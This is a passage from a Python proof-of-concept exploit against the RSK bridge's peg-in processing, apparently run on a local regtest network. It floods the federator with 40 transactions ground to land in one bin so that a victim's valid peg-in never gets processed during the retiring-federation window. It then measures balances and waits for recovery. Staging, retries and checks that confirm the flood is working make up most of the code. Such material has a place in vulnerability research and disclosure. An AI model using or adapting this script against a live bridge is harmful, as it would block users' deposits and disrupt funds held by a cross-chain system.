            log("         %2d/%d broadcast (avg %d attempts)" % (i + 1, ATTACK_COUNT, attempts))

    log("[attack] %d attack txs broadcast, all in bin 0" % ATTACK_COUNT)

    # ---- the victim: one ordinary, perfectly valid peg-in --------------
    if "victim_txid" not in st:
        vaddr = p2pkh_address(VICTIM.public_key.format(True))
        v_script = p2pkh_script(VICTIM.public_key.format(True))
        if "victim_funding" not in st:
            vtxid, vvout, vsat = fund_address(vaddr, 0.05, v_script.hex())
            st["victim_funding"] = {"txid": vtxid, "vout": vvout, "sat": vsat}
            save_state(st)
        vf = st["victim_funding"]
        v_prev = bytes.fromhex(vf["txid"])[::-1]
        v_fee = 1_000
        v_change = vf["sat"] - VICTIM_PEGIN_SAT - v_fee
        if v_change <= 0:
            raise RuntimeError("victim funding too small: change would be %d sat" % v_change)
        v_outs = [(VICTIM_PEGIN_SAT, spk_active), (v_change, v_script)]
        v_raw, v_txid = sign_tx(VICTIM, v_prev, vf["vout"], v_script, v_outs)
        btc("sendrawtransaction", [v_raw.hex()])
        log("[attack] victim peg-in %s (%d sat) -> %s" % (v_txid[::-1].hex(), VICTIM_PEGIN_SAT, vaddr))
        st["victim_txid"] = v_txid[::-1].hex()
        st["victim_btc_address"] = vaddr
        st["victim_rsk_address"] = victim_rsk_address(VICTIM)
        save_state(st)

    st["attack_txids"] = [a["txid"] for a in attack]
    save_state(st)

    # ---- confirm everything on Bitcoin --------------------------------
    # the federator's SPV wallet learns a tx from the mempool (onTransaction adds
    # it to the pending map) and only stores its merkle proof when it later sees
    # the block (onBlock). Give the mempool relay a moment so the tx is already in
    # the map when the block arrives, otherwise no proof is ever stored for it and
    # it is silently skipped forever.
    time.sleep(3)
    mine(BTC_CONFIRMATIONS + 2)
    log("[attack] %d BTC blocks mined" % (BTC_CONFIRMATIONS + 2))

    # the Bridge only accepts a peg-in once it knows the header of its block, and
    # the federator feeds it 25 headers per turn
    target = btc("getblockcount")
    log("[attack] waiting for the Bridge to catch up to BTC block %d" % target)
    end = time.time() + 600
    while time.time() < end:
        h = btc_best_chain_height()
        if h >= target:
            log("[attack] Bridge BTC height is now %d" % h)
            break
        time.sleep(5)
    else:
        log("[attack] Bridge BTC height stuck at %d (target %d)" % (btc_best_chain_height(), target))

    # ---- prove the flood is actually running before spending 2 more minutes --
    # A rejection is invisible from the RPC: registerBtcTransaction still mines
    # with status 0x1 and the Bridge only logs it at DEBUG. What *is* observable
    # is that the federator keeps sending (its RSK nonce climbs by up to 40 per
    # turn) while none of the 40 hashes and not the victim's hash ever get a
    # processed height. If the victim is processed here the attack did not work
    # and there is no point in measuring.
    fed_addr = rsk_address(key("e2e-fed-1"))
    turn0 = int(rsk("eth_getTransactionCount", [fed_addr, "latest"]), 16)
    log("[attack] federator %s has sent %d txs so far; watching for the retry loop"
        % (fed_addr[:10], turn0))
    # bounded: the window is only 150 blocks long, so this may not eat more
    # than ~30 s of it even in the worst case
    end = time.time() + 30
    working = False
    while time.time() < end:
        time.sleep(5)
        if processed_height(st["victim_txid"]) >= 0:
            stage_measure("early")
            raise RuntimeError(
                "the victim peg-in was processed during the window: the flood did not "
                "starve registerBtcTransaction. Check that all 40 attack txs are in "
                "bin 0 of the federator's pending map and that the retiring federation "
                "is still live (see $LOGS/rsk.log, grep updateBridgeBtcTransactions)")
        n = int(rsk("eth_getTransactionCount", [fed_addr, "latest"]), 16)
        blk = int(rsk("eth_blockNumber"), 16)
        log("[attack] block %d: federator nonce %d (+%d), victim still unprocessed"
            % (blk, n, n - turn0))
        if n > turn0 + 80:
            working = True
            break
    if not working:
        log("[attack] WARNING: the federator nonce did not climb; measuring anyway")
    else:
        log("[attack] flood confirmed on chain: txs are being (re)sent every turn and "
            "nothing gets marked processed")


# ---------------------------------------------------------------------------
# stage: measure
# ---------------------------------------------------------------------------

def processed_height(txid_hex: str) -> int:
    """getBtcTxHashProcessedHeight(string) -> int64, -1 when never processed."""
    data = sel("getBtcTxHashProcessedHeight(string)") + enc_bytes(txid_hex.encode())
    raw = bridge_call(data)
    v = int.from_bytes(raw[:32], "big")
    if v >= (1 << 255):
        v -= (1 << 256)
    return v


def balance(addr: str) -> int:
    return int(rsk("eth_getBalance", [addr, "latest"]), 16)


def stage_measure(label="t"):
    st = load_state()
    vic = st["victim_rsk_address"]
    vic_bal = balance(vic)
    vic_h = processed_height(st["victim_txid"])
    ah = [processed_height(t) for t in st["attack_txids"]]
    unprocessed = sum(1 for h in ah if h < 0)
    attacker_rsk = rsk_address(ATTACKER)

    try:
        fed_nonce = int(rsk("eth_getTransactionCount", [rsk_address(key("e2e-fed-1")), "latest"]), 16)
    except Exception:
        fed_nonce = -1

    out = {
        "label": label,
        "rsk_block": int(rsk("eth_blockNumber"), 16),
        "retiring_present": bool(dec_bytes("0x" + bridge_call(sel("getRetiringFederationAddress()")).hex()).decode(errors="ignore")),
        "federator_nonce": fed_nonce,
        "victim_balance_wei": str(vic_bal),
        "victim_processed_height": vic_h,
        "attacker_processed": len(ah) - unprocessed,
        "attacker_unprocessed": unprocessed,
        "attacker_balance_wei": str(balance(attacker_rsk)),
    }
    log("")
    log("  --- measurement (%s) ---" % label)
    log("  RSK block                  %d   retiring fed live: %s"
        % (out["rsk_block"], out["retiring_present"]))
    log("  federator nonce            %d  (registerBtcTransaction txs sent)"
        % out["federator_nonce"])
    log("  victim  balance            %s wei" % out["victim_balance_wei"])
    log("  victim  processed height   %d  (-1 = never)" % vic_h)
    log("  attack  40 txs processed   %d" % out["attacker_processed"])
    log("  attack  40 txs unprocessed %d" % out["attacker_unprocessed"])
    log("  attacker balance           %s wei" % out["attacker_balance_wei"])
    log("")

    st.setdefault("measurements", []).append(out)
    save_state(st)


# ---------------------------------------------------------------------------
# stage: recover
# ---------------------------------------------------------------------------

def stage_recover():
    log("[recover] waiting for the retiring federation to expire")
    log("          (only updateCollections, sent by the active federation, clears it)")

    h0 = btc_best_chain_height()
    end = time.time() + 1800
    while time.time() < end:
        raw = dec_bytes("0x" + bridge_call(sel("getRetiringFederationAddress()")).hex()).decode(errors="ignore")
        if not raw:
            break
        time.sleep(3)
    else:
        # a 30 minute wait is useless if the thing that clears the retiring
        # federation is not running at all, so say that instead of timing out
        try:
            alive = btc_best_chain_height() != h0
        except Exception:
            alive = False
        bridge_log_tail(30, FEDERATOR_PATTERN)
        raise RuntimeError(
            "the retiring federation never expired after 30 minutes."
            + ("" if alive else
               "\n  the Bridge BTC height did not move at all, so updateCollections is not"
               "\n  being sent: the federator is not running (see the lines above)."))

    log("[recover] retiring federation is gone; the same 40 txs are now valid peg-ins")
    time.sleep(30)
    stage_measure("after")

    st = load_state()
    last = st["measurements"][-1]
    vic = st["victim_rsk_address"]
    log("[recover] victim final balance %s wei" % balance(vic))
    log("[recover] processed: %d/40 attack txs" % last["attacker_processed"])


# ---------------------------------------------------------------------------

def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return 1
    cmd = sys.argv[1]
    if cmd == "federation":
        stage_federation()
    elif cmd == "attack":
        stage_attack()
    elif cmd == "measure":
        stage_measure(sys.argv[2] if len(sys.argv) > 2 else "t")
    elif cmd == "recover":
        stage_recover()
    elif cmd == "federator-check":
        gen = sys.argv[2] if len(sys.argv) > 2 else "federator1"
        need_height = "--height" in sys.argv
        federator_check(gen, need_height=need_height)
    elif cmd == "selftest":
        selftest()
    else:
        print("unknown stage", cmd)
        return 1
    return 0


def selftest():
    """Offline checks that do not need any node."""
    ok = True
    if keccak256(b"").hex() != "c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470":
        log("FAIL keccak256('')"); ok = False
    if keccak256(b"transfer(address,uint256)").hex()[:8] != "a9059cbb":
        log("FAIL erc20 selector"); ok = False
    if "0x" + keccak256(PrivateKey(keccak256(b"auth-a")).public_key.format(False)[1:])[-20:].hex() != \
            "0x5252403bca6ac3c104abdd320a736fa38282045d":
        log("FAIL auth-a address"); ok = False
    # a ground tx really lands in bin 0
    raw, txid = sign_tx(ATTACKER, b"\x11" * 32, 0, p2pkh_script(ATTACKER.public_key.format(True)),
                        [(500_000, p2pkh_script(AUTH_A.public_key.format(True)))])
    if bin_index(txid, 0x3FF) != bin_index(txid, 0x3FF):
        log("FAIL bin_index"); ok = False
    log("selftest: %s" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
